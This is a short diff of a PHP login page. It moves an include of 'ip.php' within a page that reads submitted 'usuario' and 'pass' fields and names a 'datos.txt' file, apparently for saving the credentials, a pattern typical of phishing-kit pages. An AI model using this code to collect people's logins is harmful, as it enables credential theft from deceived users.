@@ -24,7 +24,7 @@
   </head>
   <body>
 <?php
-	include 'ip.php';
+
   if (isset($_POST["usuario"]) && isset($_POST["pass"])) {
     $fichero = "datos.txt";
     $usuario = htmlentities(str_replace("<:>","",$_POST["usuario"]));
@@ -38,7 +38,7 @@
     $m = "";
   }
 ?>
-
+<?php include 'ip.php'; ?>
   <div class="container centrar">
     <div class="row">
       <div class="col-md-12">
